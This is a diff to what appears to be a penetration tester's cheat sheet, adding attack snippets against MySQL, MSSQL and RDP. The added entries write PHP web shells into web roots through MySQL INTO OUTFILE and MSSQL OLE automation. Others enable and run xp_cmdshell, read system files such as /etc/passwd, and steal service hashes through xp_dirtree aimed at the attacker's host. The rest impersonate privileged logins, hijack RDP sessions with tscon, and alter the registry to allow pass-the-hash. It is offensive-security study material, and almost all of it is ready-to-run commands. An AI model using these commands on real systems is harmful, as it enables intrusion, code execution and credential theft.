@@ -1131,7 +1131,7 @@ nxc smb <IP> -u <username> -H <NThash>
 ## attacking common services - smb - Forced Authentication - reponder server
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-responder -I <interface>
+responder -I <interface name>
 ```
 
 ## attacking common services - smb - Forced Authentication - cracking responder hashes
@@ -1188,10 +1188,195 @@ sqsh -S <IP> -U <username> -P '<password>' -h
 mssqlclient.py -p 1433 <username>@<IP> 
 ```
 
-## attacking common services - sql - mssql sqsh domain
+## attacking common services - sql - mssql sqsh
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-sqsh -S <IP> -U <serverName/.>\\<username> -P '<password>' -h
+sqsh -S <IP> -U <. or server name>\\<username> -P '<password>' -h
+```
+
+## attacking common services - mysql - list databases 
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+show databases;
+```
+
+## attacking common services - mssql - list databases 
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+select name from master.dbo.sysdatabases
+go
+```
+
+## attacking common services - mysql - select database 
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+use <database>;
+```
+
+## attacking common services - mssql - select database 
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+use <database>
+go
+```
+
+## attacking common services - mysql - show tables 
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+show tables;
+```
+
+## attacking common services - mssql - show tables 
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+select table_name FROM <database>.information_schema.tables
+go
+```
+
+## attacking common services - mysql - select all data from table 
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+select * from users;
+```
+
+## attacking common services - mssql - select all data from table
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+select * from users
+go
+```
+
+## attacking common services - mssql - MSSQL command execution XP_CMDSHELL (with privileges)
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+xp_cmdshell 'whoami'
+go
+```
+
+## attacking common services - mssql - enable MSSQL command execution (with privileges)
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+# To allow advanced options to be changed.  
+EXECUTE sp_configure 'show advanced options', 1
+go
+
+# To update the currently configured value for advanced options.  
+RECONFIGURE
+go  
+
+# To enable the feature.  
+EXECUTE sp_configure 'xp_cmdshell', 1
+go  
+
+# To update the currently configured value for this feature.  
+RECONFIGURE
+go
+```
+
+## attacking common services - mysql - write local files (verify permissions)
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+show variables like "secure_file_priv"; # if empty then we can read/write using MySQL
+```
+
+## attacking common services - mysql - write local files
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+```
+
+## attacking common services - mssql - write local files - Step 1: Enable Ole Automation Procedures (with privileges)
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+sp_configure 'show advanced options', 1
+go
+RECONFIGURE
+go
+sp_configure 'Ole Automation Procedures', 1
+go
+RECONFIGURE
+go
+```
+
+## attacking common services - mssql - write local files - Step 2: write a file (with privileges)
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+DECLARE @OLE INT
+DECLARE @FileID INT
+EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+EXECUTE sp_OADestroy @FileID
+EXECUTE sp_OADestroy @OLE
+go
+```
+
+## attacking common services - mssql - read local files (by default mssql allow file reads anywhere where the account has read access)
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+SELECT * FROM OPENROWSET(BULK N'<C:\pathToFile>', SINGLE_CLOB) AS Contents
+go
+```
+
+## attacking common services - mysql - read local files (with configuration enabled)
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+select LOAD_FILE("/etc/passwd");
+```
+
+## attacking common services - mssql - capture service hash/XP_DIRTREE Hash Stealing (turn on responder/impacket-smbserver before) 
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+EXEC master..xp_dirtree '\\<ourIP>\share\'
+go
+```
+
+## attacking common services - mssql - capture service hash/XP_SUBDIRS Hash Stealing (turn on responder/impacket-smbserver before) 
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+EXEC master..xp_subdirs '\\<ourIP>\share\'
+go
+```
+
+## attacking common services - mssql - impersonate users
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+Step 1 identify users:
+
+SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+go
+
+Step 2 verifying our current user and role. 0 = not sysadmin
+
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+go
+
+Step 3 impersonate user (execute on master DB - USE MASTER command):
+
+EXECUTE AS LOGIN = '<user2impersonate>'
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+go
+```
+
+
+## attacking common services - mssql - communicate with other databases 
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+Step 1 identify linked servers. 1 = remote server:
+
+SELECT srvname, isremote FROM sysservers
+go
+
+Step 2 identify user for the connection and its privileges (note: be careful with the quotes on the server's name if needed):
+
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<remote\Server>]
+go
 ```
 
 ## attacking common services - rdp - nmap rdp detection
@@ -1224,10 +1409,36 @@ rdesktop -u <username> -p <password> <targetIP>
 xfreerdp /u:<username> /p:<password> /v:<ip>
 ```
 
+## attacking common services - rdp - rdp session hijacking (once in the target with SYSTEM privs)
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+whoami
+query user
+tscon #<TARGET_SESSION_ID> /dest:#<OUR_SESSION_NAME>
+
+Windows service that, by default, will run as Local System and will execute any binary with SYSTEM privileges:
+
+sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
+net start sessionhijack
+(a new terminal as that other user will open)
+```
+
+## attacking common services - rdp - rdp PtH pass the hash (disable Restricted Admin Mode)
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error:
+
+"Account Restrictions are preventing this user from sign in..."
+
+This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa. It can be done using the following command:
+
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+
 ## attacking common services - rdp - rdp PtH pass the hash xfreerdp
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
+xfreerdp /v:<targetIP> /u:<user> /pth:<hash_300FF5E89EF33F83A8146C10F5AB9BB9>
 ```
 
 ## from job - discover more subnets - nmap
